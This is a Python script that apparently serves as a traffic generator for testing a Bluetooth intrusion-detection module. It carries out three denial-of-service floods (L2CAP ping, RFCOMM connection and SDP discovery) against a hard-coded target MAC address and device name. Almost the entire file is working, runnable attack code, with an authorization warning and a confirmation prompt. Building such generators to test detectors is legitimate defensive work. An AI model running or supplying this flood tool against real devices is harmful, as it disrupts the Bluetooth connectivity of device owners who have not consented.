#!/usr/bin/env python3
"""
Combined Bluetooth Attack Script
=================================
This script performs multiple types of Bluetooth attacks sequentially:
1. L2CAP Ping Flood (DoS)
2. RFCOMM Connection Flood
3. SDP Service Discovery Flood

Each attack runs for a specified duration and should be detected by Module 4.
"""

import subprocess
import time
import sys
import os
from datetime import datetime

class BluetoothAttackSuite:
    def __init__(self, target_mac="28:C6:3F:91:67:CE", target_name="DESKTOP-HFJQU5V"):
        self.target_mac = target_mac
        self.target_name = target_name
        self.attack_duration = 15  # seconds per attack
        self.threads = 5
        
    def print_banner(self):
        """Print attack suite banner"""
        print("\n" + "=" * 80)
        print("🔴 COMBINED BLUETOOTH ATTACK SUITE")
        print("=" * 80)
        print(f"Target MAC: {self.target_mac}")
        print(f"Target Name: {self.target_name}")
        print(f"Attack Duration: {self.attack_duration} seconds per attack")
        print(f"Threads: {self.threads}")
        print("=" * 80)
        print("\n⚠️  WARNING: This is for AUTHORIZED TESTING ONLY!")
        print("   Ensure you have permission to test on the target device.")
        print("\n")
        
    def check_bluetooth_available(self):
        """Check if Bluetooth tools are available"""
        print("🔍 Checking Bluetooth tools...")
        
        tools = ['l2ping', 'rfcomm', 'sdptool', 'hcitool']
        missing = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
                print(f"   ❌ {tool} - NOT FOUND")
            else:
                print(f"   ✅ {tool} - Available")
        
        if missing:
            print(f"\n⚠️  Missing tools: {', '.join(missing)}")
            print("   Install with: sudo apt-get install bluez bluez-tools")
            return False
        
        print("✅ All tools available!\n")
        return True
    
    def verify_target(self):
        """Verify target device is reachable"""
        print(f"🎯 Verifying target device: {self.target_mac}...")
        
        try:
            result = subprocess.run(
                ['hcitool', 'info', self.target_mac],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"✅ Target device is reachable")
                print(f"   Device info preview:")
                for line in result.stdout.split('\n')[:3]:
                    if line.strip():
                        print(f"   {line}")
                return True
            else:
                print(f"⚠️  Target device may not be reachable")
                print(f"   Continuing anyway...")
                return True
                
        except Exception as e:
            print(f"⚠️  Could not verify target: {e}")
            print(f"   Continuing anyway...")
            return True
    
    def create_indicator_file(self, attack_type):
        """Create attack indicator file for detection"""
        indicator_file = f"/tmp/bluetooth_{attack_type}_attack_active"
        try:
            with open(indicator_file, 'w') as f:
                f.write(f"{datetime.now().isoformat()}\n")
                f.write(f"Target: {self.target_mac}\n")
                f.write(f"Attack: {attack_type}\n")
            print(f"   📝 Created indicator: {indicator_file}")
        except Exception as e:
            print(f"   ⚠️  Could not create indicator: {e}")
    
    def remove_indicator_file(self, attack_type):
        """Remove attack indicator file"""
        indicator_file = f"/tmp/bluetooth_{attack_type}_attack_active"
        try:
            if os.path.exists(indicator_file):
                os.remove(indicator_file)
                print(f"   🧹 Removed indicator: {indicator_file}")
        except Exception as e:
            print(f"   ⚠️  Could not remove indicator: {e}")
    
    def attack_l2cap_ping_flood(self):
        """
        Attack Type 1: L2CAP Ping Flood
        Floods the target with L2CAP Echo Request packets
        """
        print("\n" + "=" * 80)
        print("🔴 ATTACK 1/3: L2CAP PING FLOOD")
        print("=" * 80)
        print(f"Description: Flooding target with L2CAP Echo Requests")
        print(f"Duration: {self.attack_duration} seconds")
        print(f"Threads: {self.threads}")
        print("=" * 80)
        
        self.create_indicator_file("l2cap_flood")
        
        processes = []
        start_time = time.time()
        
        try:
            # Launch multiple l2ping processes
            for i in range(self.threads):
                print(f"   🚀 Launching l2ping thread {i+1}/{self.threads}...")
                cmd = [
                    'l2ping',
                    '-i', 'hci0',
                    '-s', '600',
                    '-f',
                    self.target_mac
                ]
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                processes.append(process)
                time.sleep(0.1)
            
            print(f"\n✅ Attack launched with {len(processes)} threads!")
            print(f"⏱️  Attack in progress...\n")
            
            # Monitor attack progress
            while time.time() - start_time < self.attack_duration:
                remaining = int(self.attack_duration - (time.time() - start_time))
                print(f"\r   [⚡] Attack in progress... {remaining}s remaining  ", end='', flush=True)
                time.sleep(1)
            
            print(f"\n\n   [✓] Attack duration completed!")
            
        except KeyboardInterrupt:
            print("\n\n   [!] Attack interrupted by user")
        except Exception as e:
            print(f"\n\n   [!] Error during attack: {e}")
        finally:
            # Cleanup: Kill all l2ping processes
            print("   [*] Cleaning up...")
            for process in processes:
                try:
                    process.terminate()
                    process.wait(timeout=2)
                except:
                    process.kill()
            
            # Also kill any remaining l2ping processes
            subprocess.run(['pkill', '-9', 'l2ping'], stderr=subprocess.DEVNULL)
            
            self.remove_indicator_file("l2cap_flood")
            print("   [✓] Cleanup complete\n")
    
    def attack_rfcomm_flood(self):
        """
        Attack Type 2: RFCOMM Connection Flood
        Attempts to flood RFCOMM connections to overwhelm the target
        """
        print("\n" + "=" * 80)
        print("🔴 ATTACK 2/3: RFCOMM CONNECTION FLOOD")
        print("=" * 80)
        print(f"Description: Flooding RFCOMM connections")
        print(f"Duration: {self.attack_duration} seconds")
        print(f"Channels: Scanning channels 1-30")
        print("=" * 80)
        
        self.create_indicator_file("rfcomm_flood")
        
        start_time = time.time()
        connection_attempts = 0
        
        try:
            print(f"\n✅ Starting RFCOMM flood attack!")
            print(f"⏱️  Attack in progress...\n")
            
            while time.time() - start_time < self.attack_duration:
                # Try to connect to multiple RFCOMM channels
                for channel in range(1, 31):
                    if time.time() - start_time >= self.attack_duration:
                        break
                    
                    try:
                        # Attempt RFCOMM connection (will likely fail, but generates traffic)
                        subprocess.run(
                            ['rfcomm', 'connect', '0', self.target_mac, str(channel)],
                            capture_output=True,
                            timeout=0.5
                        )
                        connection_attempts += 1
                    except subprocess.TimeoutExpired:
                        connection_attempts += 1
                    except:
                        pass
                
                remaining = int(self.attack_duration - (time.time() - start_time))
                print(f"\r   [⚡] Attack in progress... {remaining}s remaining | Attempts: {connection_attempts}  ", end='', flush=True)
            
            print(f"\n\n   [✓] Attack completed! Total connection attempts: {connection_attempts}")
            
        except KeyboardInterrupt:
            print("\n\n   [!] Attack interrupted by user")
        except Exception as e:
            print(f"\n\n   [!] Error during attack: {e}")
        finally:
            print("   [*] Cleaning up...")
            # Kill any remaining rfcomm processes
            subprocess.run(['pkill', '-9', 'rfcomm'], stderr=subprocess.DEVNULL)
            self.remove_indicator_file("rfcomm_flood")
            print("   [✓] Cleanup complete\n")
    
    def attack_sdp_flood(self):
        """
        Attack Type 3: SDP Service Discovery Flood
        Floods the target with SDP service discovery requests
        """
        print("\n" + "=" * 80)
        print("🔴 ATTACK 3/3: SDP SERVICE DISCOVERY FLOOD")
        print("=" * 80)
        print(f"Description: Flooding SDP service discovery requests")
        print(f"Duration: {self.attack_duration} seconds")
        print("=" * 80)
        
        self.create_indicator_file("sdp_flood")
        
        start_time = time.time()
        sdp_requests = 0
        
        try:
            print(f"\n✅ Starting SDP flood attack!")
            print(f"⏱️  Attack in progress...\n")
            
            while time.time() - start_time < self.attack_duration:
                try:
                    # Send SDP browse request
                    subprocess.run(
                        ['sdptool', 'browse', self.target_mac],
                        capture_output=True,
                        timeout=0.5
                    )
                    sdp_requests += 1
                except subprocess.TimeoutExpired:
                    sdp_requests += 1
                except:
                    pass
                
                remaining = int(self.attack_duration - (time.time() - start_time))
                print(f"\r   [⚡] Attack in progress... {remaining}s remaining | SDP requests: {sdp_requests}  ", end='', flush=True)
            
            print(f"\n\n   [✓] Attack completed! Total SDP requests: {sdp_requests}")
            
        except KeyboardInterrupt:
            print("\n\n   [!] Attack interrupted by user")
        except Exception as e:
            print(f"\n\n   [!] Error during attack: {e}")
        finally:
            print("   [*] Cleaning up...")
            # Kill any remaining sdptool processes
            subprocess.run(['pkill', '-9', 'sdptool'], stderr=subprocess.DEVNULL)
            self.remove_indicator_file("sdp_flood")
            print("   [✓] Cleanup complete\n")
    
    def run_attack_suite(self):
        """Run all attacks in sequence"""
        self.print_banner()
        
        # Check prerequisites
        if not self.check_bluetooth_available():
            print("❌ Required tools not available. Exiting.")
            return False
        
        # Verify target
        self.verify_target()
        
        # Confirmation
        print("\n" + "=" * 80)
        print("⚠️  FINAL CONFIRMATION")
        print("=" * 80)
        print("This will perform 3 different Bluetooth attacks:")
        print("   1. L2CAP Ping Flood (15 seconds)")
        print("   2. RFCOMM Connection Flood (15 seconds)")
        print("   3. SDP Discovery Flood (15 seconds)")
        print(f"\nTotal duration: ~{self.attack_duration * 3} seconds")
        print("\n👉 Module 4 should detect ALL THREE attacks!")
        print("=" * 80)
        
        response = input("\nProceed with attacks? (yes/no): ").strip().lower()
        if response != 'yes':
            print("❌ Attack cancelled by user.")
            return False
        
        print("\n🚀 Starting attack sequence...\n")
        time.sleep(2)
        
        try:
            # Run all three attacks
            self.attack_l2cap_ping_flood()
            time.sleep(3)  # Brief pause between attacks
            
            self.attack_rfcomm_flood()
            time.sleep(3)
            
            self.attack_sdp_flood()
            
            # Final summary
            print("\n" + "=" * 80)
            print("✅ ALL ATTACKS COMPLETED")
            print("=" * 80)
            print(f"📊 Attack Summary:")
            print(f"   - L2CAP Ping Flood: {self.attack_duration}s with {self.threads} threads")
            print(f"   - RFCOMM Flood: {self.attack_duration}s")
            print(f"   - SDP Flood: {self.attack_duration}s")
            print(f"\n   Target MAC: {self.target_mac}")
            print(f"   Target Name: {self.target_name}")
            print(f"   Total Duration: {self.attack_duration * 3} seconds")
            print("\n👉 Check Module 4 Dashboard: http://localhost:8000/module4")
            print("   All 3 attacks should be detected and displayed!")
            print("\n⚠️  Attacks will appear for 20 seconds then move to history.")
            print("=" * 80)
            
            return True
            
        except KeyboardInterrupt:
            print("\n\n❌ Attack suite interrupted by user!")
            return False
        except Exception as e:
            print(f"\n\n❌ Error during attack suite: {e}")
            return False

def main():
    """Main function"""
    # Check if running as root (required for Bluetooth operations)
    if os.geteuid() != 0:
        print("❌ This script must be run as root!")
        print("   Please run: sudo python3 Combined_Bluetooth_Attack.py")
        sys.exit(1)
    
    # Create and run attack suite
    attacker = BluetoothAttackSuite()
    success = attacker.run_attack_suite()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()

